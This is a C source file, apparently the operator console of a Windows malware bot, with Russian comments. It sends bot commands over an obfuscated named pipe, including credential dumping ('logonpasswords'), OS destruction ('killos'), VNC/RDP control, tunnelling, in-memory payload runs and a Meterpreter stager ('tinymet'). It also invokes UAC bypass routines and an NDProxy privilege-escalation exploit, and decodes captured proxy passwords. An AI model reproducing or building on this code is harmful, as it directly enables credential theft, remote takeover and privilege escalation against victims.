#include <stdio.h>
#include "core\core.h"
#include "core\path.h"
#include "core\process.h"
#include "core\http.h"
#include "core\file.h"
#include "core\vector.h"
#include "core\rand.h"
#include "core\crypt.h"
#include "core\util.h"
#include "core\cab.h"
#include "core\hook.h"
#include "core\abstract.h"
#include "core\pipe.h"
#include "core\proxy.h"
#include "core\elevation.h"

const int GeneralCmdTask = 1; //выполнении ботом команды, передаетс€ текстова€ команда (в data) и ее длина (в sz_data) без учета завершающего нул€
const int GeneralCmdInfo = 2; //возвращает информацию о боте
const int GeneralCmdGetProxy = 3; //возвращает список прокси


char nameGeneralPipe[64];
char XorMask[32];

bool CmdSendBot( StringArray& args );
bool CmdInfo( StringArray& args );
bool CmdGetProxy( StringArray& args );
bool CmdExit( StringArray& args );
bool CmdUAC( StringArray& args );
bool CmdElevation( StringArray& args );

//тип функции выполн€ющей команду
typedef bool (*typeFuncExecCmd)( StringArray& args );

//св€зка имени команды с функцией
struct CommandFunc
{
	char* name;
	typeFuncExecCmd func;
};

CommandFunc commands[] = 
{
//команды отсылаемы боту
	{ "video", CmdSendBot },
	{ "download", CmdSendBot },
	{ "runmem", CmdSendBot },
	{ "ammyy", CmdSendBot },
	{ "update", CmdSendBot },
	{ "updklgcfg", CmdSendBot },
	/*{ "ifobs", CmdSendBot },*/
	{ "httpproxy", CmdSendBot },
	{ "killos", CmdSendBot },
	{ "reboot", CmdSendBot },
	{ "tunnel", CmdSendBot },
	{ "adminka", CmdSendBot },
	{ "server", CmdSendBot },
	{ "user", CmdSendBot },
	{ "rdp", CmdSendBot },
	{ "screenshot", CmdSendBot },
	{ "sleep", CmdSendBot },
	{ "logonpasswords", CmdSendBot },
	{ "vnc", CmdSendBot },
	{ "runmem", CmdSendBot },
	{ "dupl", CmdSendBot },
	{ "findfiles", CmdSendBot },
	{ "runfile", CmdSendBot },
	{ "killbot", CmdSendBot },
	{ "del", CmdSendBot },
	{ "secure", CmdSendBot },
	{ "plugins", CmdSendBot },
	{ "tinymet", CmdSendBot },
	{ "killprocess", CmdSendBot },
//команды выполн€емые утилитой
	{ "info", CmdInfo },
	{ "getproxy", CmdGetProxy },
	{ "exit", CmdExit },
	{ "uac", CmdUAC },
	{ "elevation", CmdElevation },
	{ 0, 0 }
};

bool Init();
bool DispatchArgs( StringArray& args );

int main(int argc, char* argv[])
{
	WinAPI::Init();
	if( !Core::Init() )
	{
		printf( "core is not init\n" );
		return 0;
	}
	Rand::Init();
	if( !Init() )
	{
		printf( "not init botcmd.exe\n" );
		return 0;
	}

	StringBuilder arg;
	StringArray sa;
	if( argc == 1 )
	{
		bool stop = false;
		CmdInfo(sa);
		fflush(stdout);
		wchar_t buf[256];
		while( !stop )
		{
			printf( "botcmd: " ); fflush(stdout); fflush(stdin);
			if( wscanf_s( L"%[^\n]", buf, sizeof(buf) ) > 0 )
			{
				int argc2 = 0;
				wchar_t** argv2 = CommandLineToArgvW( buf, &argc2 );
				if( argc2 > 0 )
				{
					sa.DelAll();
					for( int i = 0; i < argc2; i++ )
					{
						arg.ToWin1251( argv2[i] );
						arg.Lower();
						sa.Add(arg);
					}
					stop = DispatchArgs(sa);
					fflush(stdout);
				}
				API(KERNEL32, LocalFree)(argv2);
			}
		}
	}
	else
	{
		for( int i = 1; i < argc; i++ )
		{
			arg = argv[i];
			arg.Lower();
			sa.Add(arg);
		}
		DispatchArgs(sa);
		fflush(stdout);
	}

	return 0;
}

bool Init()
{
	byte buf[64];
	int c_macAddress = GetMacAddress(buf);
	if( c_macAddress == 0 ) return false;
	//мак адрес занимает 6 байт
	int hash1 = *((DWORD*)buf) ^ *((DWORD*)(buf + 2));
	DWORD c_compName = sizeof(buf) - c_macAddress;
	if( API(KERNEL32, GetComputerNameA)( (char*)buf + c_macAddress, &c_compName ) == 0 ) return false;
	uint hash2 = CalcHash( buf, c_macAddress + c_compName );
	//маску делаем на основе уида без префикса
	Abstract::SizeXorVector = 0;
	Abstract::XorVector = 0;
	Str::Format( XorMask, "%08x%08x", hash1, hash2 );
	StringBuilder name( nameGeneralPipe, sizeof(nameGeneralPipe) );
	Crypt::Name( "GeneralPipe", XorMask, name );
	return true;
}

bool DispatchArgs( StringArray& args )
{
	int i = 0;
	while( commands[i].name )
	{
		if( Str::Cmp( commands[i].name, args[0]->c_str() ) == 0 )
		{
			return commands[i].func(args);
		}
		i++;
	}
	printf( "Unknow command '%s'\n", args[0]->c_str() );
	return false;
}

bool CmdSendBot( StringArray& args )
{
	StringBuilder s;
	for( int i = 0; i < args.Count(); i++ )
	{
		if( i > 0 ) s += ' ';
		s += *args[i];
	}
	if( !PipeClient::Send( nameGeneralPipe, GeneralCmdTask, s.c_str(), s.Len() ) )
	{
		printf( "Bot is not found\n" );
	}
	return false;
}

/////////////////////////////////////////////////////////////////////////////////////////

struct InfoBot
{
	DWORD pidMain; //пид основного процесса
	DWORD pidServer; //пид видео процесса
	char uid[48];
	char comment[1024]; //информаци€ об окружении бота
};

bool CmdInfo( StringArray& args )
{
	PipeClient pipe(nameGeneralPipe);
	Mem::Data data;
	if( pipe.Request( GeneralCmdInfo, 0, 0, data ) )
	{
		if( sizeof(InfoBot) == data.Len() )
		{
			InfoBot* info = (InfoBot*)data.Ptr();
			printf( "About bot:\n\tUID: %s\n\tpid main process: %d\n\tcomment: %s\n", info->uid, info->pidMain, info->comment );
		}
		else
		{
			printf( "ERROR: bot return unknow data, possible wrong version\n" );
		}
	}
	else
	{
		printf( "Bot is not found\n" );
	}
	return false;
}

bool CmdGetProxy( StringArray& args )
{
	PipeClient pipe(nameGeneralPipe);
	Mem::Data data;
	if( pipe.Request( GeneralCmdGetProxy, 0, 0, data ) )
	{
		int count = *((int*)data.Ptr());
		Proxy::Info* addr = (Proxy::Info*)(data.p_byte() + sizeof(count));
		printf( "Count proxy: %d\n", count );
		for( int i = 0; i < count; i++ )
		{
			char* protocol = "unknow";
			switch( addr[i].type )
			{
				case Proxy::HTTP: protocol = "http"; break;
				case Proxy::HTTPS: protocol = "https"; break;
				case Proxy::SOCKS5: protocol = "socks5"; break;
			}
			printf( "\t%d: protocol: %s, addr: %s:%d\n\t   Proxy-Authorization: %s", i + 1, protocol, addr[i].ipPort.ip, addr[i].ipPort.port, addr[i].authentication );
			if( addr[i].authentication[0] )
			{
				int p = Str::IndexOf( addr[i].authentication, ' ' );
				if( p > 0 )
				{
					Mem::Data logpsw;
					addr[i].authentication[p] = 0;
					Str::Lower(addr[i].authentication);
					StringBuilder s( 0, -1, addr[i].authentication + p + 1 );
					if( Str::Cmp( addr[i].authentication, "basic", 5 ) == 0 )
					{
						if( Crypt::FromBase64( s, logpsw ) )
						{
							StringBuilder s2;
							s2.Cat( logpsw.p_char(), logpsw.Len() );
							printf( " (%s)", s2.c_str(), logpsw.Len() );
						}
					}
				}
			}
			printf( "\n" );
		}
	}
	else
	{
		printf( "Bot is not found\n" );
	}
	return false;
}

bool CmdExit( StringArray& args )
{
	return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////

extern bool UAC_aq( bool dll, const char* path );
extern bool UAC_cb( bool dll, const char* path );

bool CmdUAC( StringArray& args )
{
	if( args.Count() < 4 )
	{
		printf( "ERROR: needed 4 params\nFormat command: uac (aq|cb) (exe|dll) path [args]\n" );
		return false;
	}
	int type = 0;
	if( *args[1] == "aq" )
		type = 1;
	else if( *args[1] == "cb" )
		type = 2;
	else
	{
		printf( "ERROR: unknow param %s\n", args[1]->c_str() );
		return false;
	}

	bool dll = false;
	if( *args[2] == "dll" )
		dll = true;
	else if( *args[2] == "exe" )
		dll = false;
	else
	{
		printf( "ERROR: unknow param %s\n", args[2]->c_str() );
		return false;
	}

	StringBuilder path(MAX_PATH);
	for( int i = 3; i < args.Count(); i++ )
	{
		if( !path.IsEmpty() ) path += ' ';
		path += args[3];
	}
	switch( type )
	{
		case 1: UAC_aq( dll, path ); break;
		case 2: UAC_cb( dll, path ); break;
	}
	return false;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool CmdElevation( StringArray& args )
{
	if( args.Count() < 3 )
	{
		printf( "ERROR: needed 2 params\nFormat command: elevation name pid\n" );
		return false;
	}
	int type = 0;
	if( *args[1] == "ndpproxy" )
		type = 1;
	else
	{
		printf( "ERROR: unknow param %s\n", args[1]->c_str() );
		return false;
	}
	int pid = args[2]->ToInt();
	StringBuilderStack<MAX_PATH> nameProcess;
	Process::Name( pid, nameProcess, true );
	if( nameProcess.IsEmpty() )
	{
		printf( "ERROR: process for PID %d not found\n", pid );
		return false;
	}
	printf( "Name process: %s\n", nameProcess.c_str() );
	bool res = false;
	switch( type )
	{
		case 1:
			res = Elevation::NDProxy(pid);
			break;
	}
	if( res )
	{
		printf( "Elevation is successfull\n" );
	}
	else
	{
		printf( "Elevation is wrong\n" );
	}
	return false;
}

